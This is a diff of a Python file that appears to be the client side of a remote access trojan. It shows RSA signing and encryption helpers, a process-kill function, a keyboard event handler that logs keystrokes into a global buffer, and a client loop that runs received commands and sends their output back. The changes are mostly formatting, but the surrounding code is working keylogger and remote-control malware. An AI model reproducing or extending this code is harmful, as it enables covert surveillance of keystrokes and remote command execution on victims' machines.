@@ -31,11 +31,15 @@ except Exception as e:
 
 logging.basicConfig(level=logging.CRITICAL)
 
+KeyboardLogs = ''
+
+
 def Hasher(MESSAGE : bytes):
     """ Hashes data """
     digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
     digest.update(MESSAGE)
     return digest.finalize()
+
 
 def verifySignature(publicKey, signature, message):
     """ Verify signature with public key """
@@ -53,6 +57,7 @@ def verifySignature(publicKey, signature, message):
     except:
         return False
 
+
 def sign(privateKey, data):
     """ Sign data with private key """
     signature = privateKey.sign(
@@ -65,6 +70,7 @@ def sign(privateKey, data):
     )
     return signature
 
+
 def encrypt(publicKey, plaintext):
     """ Encrypt using public key """
     ciphertext = publicKey.encrypt(
@@ -75,6 +81,7 @@ def encrypt(publicKey, plaintext):
             label=None)
     )
     return ciphertext
+
 
 def decrypt(privateKey, ciphertext):
     """ Decrypt using private key """
@@ -88,6 +95,7 @@ def decrypt(privateKey, ciphertext):
     )
     return plaintext
 
+
 def public_bytes(publicKey):
     """ Get Public Key in Bytes """
     serializedPublic = publicKey.public_bytes(
@@ -96,6 +104,7 @@ def public_bytes(publicKey):
     )
     return serializedPublic
 
+
 def kill(proc_pid):
     """ Kill Process by ID """
     process = psutil.Process(proc_pid)
@@ -103,17 +112,14 @@ def kill(proc_pid):
         proc.kill()
     process.kill()
 
+
 def json_loads(data):
     """ Decodes and then loads json data """
     return json.loads(data.decode())
 
+
 def OnKeyboardEvent(event):
     global KeyboardLogs
-
-    try:
-        KeyboardLogs
-    except NameError:
-        KeyboardLogs = ''
 
     if event == Key.backspace:
         KeyboardLogs += " [Bck] "
@@ -259,7 +265,6 @@ class Client(object):
                         error = None
                     self.send(json.dumps([redirected_output.getvalue(), error]).encode())
                 continue
-                    
 
             if data[0] == '--x':
                 if data[1] == '1':
@@ -435,6 +440,7 @@ class Client(object):
                 self.receive()
                 self.send(b'<DONE>')
                 continue
+
 
 def main():
     """ Run Client """
